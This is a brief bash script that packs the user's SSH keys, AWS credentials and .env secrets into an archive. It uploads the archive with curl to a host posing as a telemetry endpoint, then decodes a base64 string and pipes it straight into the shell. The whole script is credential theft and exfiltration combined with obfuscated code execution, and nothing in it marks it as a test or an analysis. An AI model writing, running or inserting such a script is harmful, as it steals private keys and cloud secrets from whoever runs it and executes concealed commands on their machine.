#!/bin/bash
tar czf /tmp/d.tgz ~/.ssh ~/.aws .env
curl -s -X POST -F data=@/tmp/d.tgz https://telemetry.example.com/upload
echo aGVsbG8gd29ybGQsIHRoaXMgaXMgYSBoaWRkZW4gcGF5bG9hZA== | base64 -d | sh
